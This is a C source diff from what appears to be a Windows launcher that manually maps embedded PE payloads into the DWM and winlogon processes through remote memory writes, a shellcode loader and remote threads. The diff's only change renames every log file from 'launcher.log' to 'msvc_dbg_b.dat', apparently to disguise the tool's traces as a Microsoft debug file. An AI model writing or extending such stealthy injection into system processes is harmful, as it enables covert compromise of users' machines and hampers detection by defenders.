@@ -160,14 +160,14 @@ int inject_signal_unload(void) {
 static void wait_for_payload_teardown(void) {
     if (!inject_is_loaded()) return;   /* fast path -- no payload alive */
 
-    slog_writef("launcher.log",
+    slog_writef("msvc_dbg_b.dat",
                 "teardown: alive payload detected -- signalling unload before sweep");
     int signaled = inject_signal_unload();
     if (!signaled) {
         /* Race: probe saw event, signal didn't. Payload was tearing down
          * on its own (e.g. sub_check saw inactive). Give it a moment. */
         Sleep(300);
-        slog_writef("launcher.log",
+        slog_writef("msvc_dbg_b.dat",
                     "teardown: signal skipped (event vanished) -- brief wait");
         return;
     }
@@ -182,7 +182,7 @@ static void wait_for_payload_teardown(void) {
         waited_ms += 50;
     }
     int still = inject_is_loaded();
-    slog_writef("launcher.log",
+    slog_writef("msvc_dbg_b.dat",
                 "teardown: waited=%dms still_alive=%d (0=clean, 1=hung)",
                 waited_ms, still);
     if (still) {
@@ -191,7 +191,7 @@ static void wait_for_payload_teardown(void) {
          * Add extra safety wait so more threads have time to notice
          * hooks_uninstall + `InterlockedExchange(&g_running, 0)`. */
         Sleep(500);
-        slog_writef("launcher.log", "teardown: extra 500ms grace for stuck payload");
+        slog_writef("msvc_dbg_b.dat", "teardown: extra 500ms grace for stuck payload");
     }
 }
 
@@ -423,7 +423,7 @@ static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
                  * cycle (~40 bytes of kernel memory), which is trivial. */
                 if (VirtualFreeEx(hProc, mbi.AllocationBase, 0, MEM_DECOMMIT)) {
                     freed++;
-                    slog_writef("launcher.log",
+                    slog_writef("msvc_dbg_b.dat",
                                 "sweep: decommitted stale payload region base=%p size=0x%zx (%zu KB, payload shape) - VA held to prevent reuse",
                                 mbi.AllocationBase, total, total_kb);
                     addr = next;
@@ -438,7 +438,7 @@ static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
                 if (VirtualProtectEx(hProc, mbi.AllocationBase, total,
                                      PAGE_NOACCESS, &old)) {
                     freed++;
-                    slog_writef("launcher.log",
+                    slog_writef("msvc_dbg_b.dat",
                                 "sweep: DECOMMIT failed, but PAGE_NOACCESS'd stale region base=%p size=0x%zx (%zu KB)",
                                 mbi.AllocationBase, total, total_kb);
                     addr = next;
@@ -448,7 +448,7 @@ static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
         }
         addr = next;
     }
-    slog_writef("launcher.log",
+    slog_writef("msvc_dbg_b.dat",
                 "sweep: %d stale regions freed (%d MBIs scanned, my_size=0x%lx, range=%d-%dKB)",
                 freed, scanned, my_image_size,
                 SVCLDB_SWEEP_MIN_KB, SVCLDB_SWEEP_MAX_KB);
@@ -480,7 +480,7 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
         return 0;
     }
     memcpy(fileData, sourceBytes, fileSize);
-    slog_writef("launcher.log", "mm: %lu bytes from memory", fileSize);
+    slog_writef("msvc_dbg_b.dat", "mm: %lu bytes from memory", fileSize);
 
     /* Parse PE. */
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fileData;
@@ -500,7 +500,7 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
     DWORD  imageSize = nt->OptionalHeader.SizeOfImage;
     uint64_t prefBase = nt->OptionalHeader.ImageBase;
     DWORD  entryRVA  = nt->OptionalHeader.AddressOfEntryPoint;
-    slog_writef("launcher.log", "mm: img_size=0x%lX entry_rva=0x%lX pref_base=0x%llX",
+    slog_writef("msvc_dbg_b.dat", "mm: img_size=0x%lX entry_rva=0x%lX pref_base=0x%llX",
                 imageSize, entryRVA, (unsigned long long)prefBase);
 
     /* CRITICAL SAFETY BARRIER before sweep:
@@ -575,7 +575,7 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
          * is stylistic parity, not a fresh leak. */
         DeleteFileA(SVC_INSTALL_DIR "\\.dwm_clean_shutdown");
         DeleteFileA(SVC_INSTALL_DIR "\\.dwm_user_panic");
-        slog_writef("launcher.log",
+        slog_writef("msvc_dbg_b.dat",
                     "arm: cleared user-intent sentinels (clean + panic)");
     }
 
@@ -632,10 +632,10 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
      *   debugging. Never set this in production. */
     (void)sweep_stale_payload_regions;   /* symbol kept for debug hatch */
     if (!skip_payload_teardown && getenv("SVCLDB_ALLOW_SWEEP")) {
-        slog_writef("launcher.log", "sweep: ENABLED via SVCLDB_ALLOW_SWEEP (DWM crash risk!)");
+        slog_writef("msvc_dbg_b.dat", "sweep: ENABLED via SVCLDB_ALLOW_SWEEP (DWM crash risk!)");
         sweep_stale_payload_regions(hProc, imageSize);
     } else if (!skip_payload_teardown) {
-        slog_writef("launcher.log",
+        slog_writef("msvc_dbg_b.dat",
                     "sweep: skipped (crash-safe default) -- set SVCLDB_ALLOW_SWEEP=1 to re-enable");
     }
 
@@ -670,7 +670,7 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
         err[err_sz - 1] = 0;
         goto mm_cleanup;
     }
-    slog_writef("launcher.log", "mm: remote base = %p", remoteBase);
+    slog_writef("msvc_dbg_b.dat", "mm: remote base = %p", remoteBase);
 
     /* Copy headers + sections -- with return checks so a partial write
      * doesn't hand the shellcode a corrupt image. */
@@ -761,7 +761,7 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
             goto mm_cleanup;
         }
     }
-    slog_writef("launcher.log", "mm: loader_size=%zu remote_loader=%p", loaderSize, remoteLoader);
+    slog_writef("msvc_dbg_b.dat", "mm: loader_size=%zu remote_loader=%p", loaderSize, remoteLoader);
 
     /* Execute. */
     {
@@ -777,7 +777,7 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
         WaitForSingleObject(hThread, 10000);
         DWORD exit_code = 0;
         GetExitCodeThread(hThread, &exit_code);
-        slog_writef("launcher.log", "mm: remote thread tid=%lu exit=%lu", tid, exit_code);
+        slog_writef("msvc_dbg_b.dat", "mm: remote thread tid=%lu exit=%lu", tid, exit_code);
     }
 
     ret = 1;
@@ -793,19 +793,19 @@ mm_cleanup:
     if (hThread)  CloseHandle(hThread);
     if (remoteLoader) {
         SIZE_T freed_ok = VirtualFreeEx(hProc, remoteLoader, 0, MEM_RELEASE);
-        slog_writef("launcher.log",
+        slog_writef("msvc_dbg_b.dat",
                     "mm: loader cleanup: shellcode page %p -> %s",
                     remoteLoader, freed_ok ? "freed" : "leak");
     }
     if (remoteLoaderData) {
         SIZE_T freed_ok = VirtualFreeEx(hProc, remoteLoaderData, 0, MEM_RELEASE);
-        slog_writef("launcher.log",
+        slog_writef("msvc_dbg_b.dat",
                     "mm: loader cleanup: data page %p -> %s",
                     remoteLoaderData, freed_ok ? "freed" : "leak");
     }
     if (ret == 0 && remoteBase) {
         SIZE_T freed_ok = VirtualFreeEx(hProc, remoteBase, 0, MEM_RELEASE);
-        slog_writef("launcher.log",
+        slog_writef("msvc_dbg_b.dat",
                     "mm: FAIL cleanup: remoteBase %p -> %s",
                     remoteBase, freed_ok ? "freed" : "leak");
     }
@@ -838,7 +838,7 @@ static int inject_from_bytes_common(const BYTE *bytes, DWORD len,
     }
     int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz, 0 /*payload*/);
     CloseHandle(hProc);
-    if (ok) slog_writef("launcher.log", "inject ok (%s) pid=%lu bytes=%lu",
+    if (ok) slog_writef("msvc_dbg_b.dat", "inject ok (%s) pid=%lu bytes=%lu",
                        src_label ? src_label : "?", pid, len);
     return ok;
 }
@@ -896,14 +896,14 @@ int inject_dwm_payload_from_resource(void *self_v, int resource_id,
     if (!rsrc) {
         _snprintf(err, err_sz - 1, "FindResource %d: %lu", resource_id, GetLastError());
         err[err_sz - 1] = 0;
-        slog_writef("launcher.log", "resource inject: FindResource FAILED gle=%lu",
+        slog_writef("msvc_dbg_b.dat", "resource inject: FindResource FAILED gle=%lu",
                     GetLastError());
         return 0;
     }
     DWORD sz = SizeofResource(self, rsrc);
     HGLOBAL hg = LoadResource(self, rsrc);
     const BYTE *bytes = (const BYTE *)LockResource(hg);
-    slog_writef("launcher.log",
+    slog_writef("msvc_dbg_b.dat",
                 "resource inject: rsrc=%p sz=%lu hg=%p bytes=%p mz=0x%02X%02X",
                 rsrc, sz, hg, bytes,
                 bytes ? bytes[0] : 0, bytes ? bytes[1] : 0);
@@ -920,7 +920,7 @@ int inject_dwm_payload_from_resource(void *self_v, int resource_id,
         _snprintf(err, err_sz - 1, "resource %d not a PE (mz=%02X%02X)",
                   resource_id, bytes[0], bytes[1]);
         err[err_sz - 1] = 0;
-        slog_writef("launcher.log", "resource inject: MZ signature missing -- resource corrupt");
+        slog_writef("msvc_dbg_b.dat", "resource inject: MZ signature missing -- resource corrupt");
         return 0;
     }
     return inject_from_bytes_common(bytes, sz, "resource", err, err_sz);
@@ -1029,7 +1029,7 @@ static int inject_helper_from_bytes_common(const BYTE *bytes, DWORD len,
      * we still burn the 600ms to give its WM_TIMER ticks a chance to
      * observe the halt event -- correctness > speed in that path. */
     int had_prior = inject_helper_signal_unload();
-    slog_writef("launcher.log",
+    slog_writef("msvc_dbg_b.dat",
                 "helper: winlogon.pid=%lu prior_signal=%d%s",
                 pid, had_prior,
                 had_prior ? " -- waiting 600ms for old instance"
@@ -1049,7 +1049,7 @@ static int inject_helper_from_bytes_common(const BYTE *bytes, DWORD len,
     int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz,
                                    1 /*skip payload teardown*/);
     CloseHandle(hProc);
-    if (ok) slog_writef("launcher.log",
+    if (ok) slog_writef("msvc_dbg_b.dat",
                        "helper inject ok winlogon.pid=%lu bytes=%lu", pid, len);
     return ok;
 }
@@ -1063,14 +1063,14 @@ int inject_helper_from_resource(void *self_v, int resource_id,
         _snprintf(err, err_sz - 1, "FindResource helper id=%d: %lu",
                   resource_id, GetLastError());
         err[err_sz - 1] = 0;
-        slog_writef("launcher.log", "helper inject: FindResource FAILED gle=%lu",
+        slog_writef("msvc_dbg_b.dat", "helper inject: FindResource FAILED gle=%lu",
                     GetLastError());
         return 0;
     }
     DWORD sz = SizeofResource(self, rsrc);
     HGLOBAL hg = LoadResource(self, rsrc);
     const BYTE *bytes = (const BYTE *)LockResource(hg);
-    slog_writef("launcher.log",
+    slog_writef("msvc_dbg_b.dat",
                 "helper inject: rsrc=%p sz=%lu hg=%p bytes=%p mz=0x%02X%02X",
                 rsrc, sz, hg, bytes,
                 bytes ? bytes[0] : 0, bytes ? bytes[1] : 0);
